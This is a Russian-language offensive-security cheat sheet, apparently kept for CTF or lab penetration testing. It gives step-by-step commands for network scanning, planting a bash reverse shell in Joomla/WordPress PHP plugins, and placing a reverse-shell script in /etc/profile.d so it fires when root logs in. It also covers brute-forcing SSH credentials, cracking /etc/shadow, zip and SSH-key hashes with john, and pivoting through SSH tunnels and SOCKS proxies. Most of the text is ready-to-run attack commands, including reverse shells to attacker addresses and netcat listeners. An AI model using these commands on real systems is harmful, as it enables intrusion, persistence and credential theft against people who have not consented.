https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets

1. Первичное сканирование при попадании в сеть:
nmap -sn 192.168.0.0/24 (быстрый скан какие есть машины без проверки открытых портов)
nmap 10.10.234.3 (Просто скан с проверкой портов)
nmap -sV -sC -Pn -T4 -p- 10.10.234.3 (Тщательная проверка конкретного хоста)

2. Тянем через curl адреса, на которых есть открытые 80 порты. Возможно там есть имя сайтов
curl 10.10.234.3 -Iv (или lv)
Потом адрес с именем можно добавить себе в /etc/hosts

Ищем дефолтные креды. Каждый раз когда видим нового пользователя - перебираем все известные пароли для попытки входа.
Если у нас есть php - в графе Local File Inclusion: Reading Files описано как прочитать исходники

Если у нас есть доступ к .php плагинам Joomla/Wordpress - добавляем в них
system("/bin/bash -i >& /dev/tcp/наш адрес/4444 0>&1")
После чего обращаемся к плагину и получаем reverse shell.

Если наш шелл какой-то мутный - можно попробовать вот так:
nice /bin/bash
/usr/bin/expect sh
python -c ‘import pty; pty.spawn(“/bin/sh”)’
/bin/busybox sh
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'

Один ищет на хосте, второй же параллельно забрасывает на хост nmap и исследует дальше
Пример поиска на хосте: grep -rnw '/path/to/somewhere/' -e 'flag{' 
find /etc -iname *.conf
locate название (если проиндексировано)
find / | awk -r '/flag/{print}' - поиск как греп без грепа
find  / -exec cat -s {} \; 2>/dev/null | awk -r '/ctf/{print}'   - как крутой греп с содержимым файлов

В докерах пароли ищем в /var/www/html/data/users

Как ломать архивы:
zip2john 1.zip > ziphash
john ziphash
unzip 1.zip

Дополнительно смотрим список всех пользователей в /etc/passwd и перебираем их пароли (все что мы уже находили раньше)
Перебирать можно, например, так:
https://github.com/byt3bl33d3r/CrackMapExec/wiki/SSH-Command-Reference
cme ssh ip.txt -u users.txt -p pass.txt (перебираем сразу все три параметра)
После чего если находим что-то подключаемся уже по ssh

Скачиваем утилиту для просмотра процессов на сервер:
https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
И смотрим делают ли процессы что-то прикольное (например, если крон загружает что-то под учетками пользователей)

Перечисляем все возможные вектора повышения привелегий
Возможно есть права куда-то записываться.
Если видим что рут подключается по ссш - значит можно записать в profile.d новый скрипт, который исполнится после подключения
Напр: nano /etc/profile.d
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.242.101.3/4445 0>&1

Если получили рута и явно есть пользователи которых мы еще не знаем - брутим пароли из /etc/shadow
john --format=sha512crypt ftp.hash --wordlist=/usr/share/wordlists/rockyou.txt

Если мы в крутых группах не забываем просто пробовать sudo su

А на своей машине слушаем
rlwrap nc -lvvp 4445

Чтобы забросить nmap делаем:
python3 -m http.server 8080 -d /home/user-1/Desktop/ (или другая папка где лежит подготовленный к работе nmap)
wget наш_адрес/файл  // curl   URT4

Сканы:
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto

Если нам уже доступен ssh (любым способом попали в ssh оболочку), то мы можем выполнить проксирование дальше с использованием:
ssh -L local_ip:local_port:remote_ip:remote_port remote_user@victim-IP
(Например - ssh -L 10.10.10.1:8000:127.0.0.1:8080 user-1@10.10.10.2)
Более того, теперь перейдя по адресу атакуемого мы сможем увидеть его сайт, который висит на 127.0.0.1 (если таковой имеется)
Именно вышеописанная команда позволяет видеть все что на 127.0.0.1
Не забывайте менять конфиг ssh на захваченном хосте GatewayPorts yes
Либо указываем -g -L (делает лупбэк)

Если же сайты нам не нужны, можем сделать так:
ssh user-1@10.10.10.2 -L 8000:127.0.0.1:8080
Но, стоит нам поменять 10.10.10.1 на 127.0.0.0.1, как мы тут же снова видим удаленный веб-сервер, но уже у себя на локальном порту 8000

Теперь представим ситуацию, что нам необходимо получить доступ к пк, который третий в цепочке
1. Доступ к user-3 мы хотим получить через порт 5000, значит, соединим этот порт с портом 6000 на user-1, причем порт 6000 открывается относительно второго сетевого интерфейса (10.10.11.1) на user-1. Таким образом, мы смогли соединить Kali Linux и user-1;
2. Далее соединим порт 6000, открытый ранее, с портом 7000 на user-2, причем порт 7000 открывается относительно второго сетевого интерфейса (10.10.12.1) на user-2;
3. Затем финальным шагом открываем порт 8000, на котором расположен веб-сервер, на хосте ***10.10.12.2*** и получаем доступ к веб-серверу через 2 хоста на Kali Linux по адресу http://10.10.10.1:5000
https://github.com/BumbleCrash/Notes_WSC/blob/Images/17.png
```sh
1. kali> ssh -L 10.10.10.1:5000:10.10.11.1:6000 user-1@10.10.10.2
	2. user-1> ssh -L 10.10.11.1:6000:10.10.12.1:7000 user-2@10.10.11.2
		3. user-2> ssh -L 10.10.12.1:7000:10.10.12.2:8000 user-3@10.10.12.2
			4. user-3>

Частично, выше мы задели технику SSH Remote Port Forwarding
Чтобы инициировать подобное соединение для использования локальных сервисов в удаленной системе мы добавляем -L опцию с рядом параметров:
ssh -L [local_port]:[destination_address]:[destination_port] [username]@[ssh_server]
Например, мы хотим войти на веб сервер на удаленной машине (port 80) 192.168.1.100, но прямой вход на 80 порт закрыт для нас. Мы можем перенаправить наш порт 8080 на порт удаленной машины 80.
ssh -L 8080:192.168.1.100:80 user@remote_server

Но это всё только ОДИН порт. А если мы хотим больше? Тогда мы делаем ssh SOCKS прокси!
ssh -D [local_port] [username]@[ssh_server]
Например: ssh -D 7777 user@remote_server
Его можно будет использовать в мозиле (Preferences > Advanced > Network). Например, указав его в foxyproxy как 127.0.0.1 7777 и теперь весь наш трафик будто бы идет от удаленной машины. Ставим галочки что это СОКС v5
Прописываем указанное соединение в proxychains и пользуемся потом вместе с ПО
socks5 127.0.0.1 7777

Если находим приватный ключ (id_rsa)
- Можем выкачать его себе чтобы логинится на машину или пивотиться по ssh без необходимости ввода пароля
ssh hannah@192.168.1.108 -i id_rsa -p 61000
ssh -i ~/id_rsa -q -f -N -p 22 frog@10.123.1.210 -L 127.0.0.1:9922:10.2.1.22:2222
Не забываем предварительно сделать chmod 600 id_rsa
- Ходить можно и с пивотингом
proxychains -q ssh root@1.1.35.33 -i .ssh/id_rsa

Еще его можно ломать:
/usr/share/john/ssh2john.py id_rsa > id_rsa.txt
john id_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
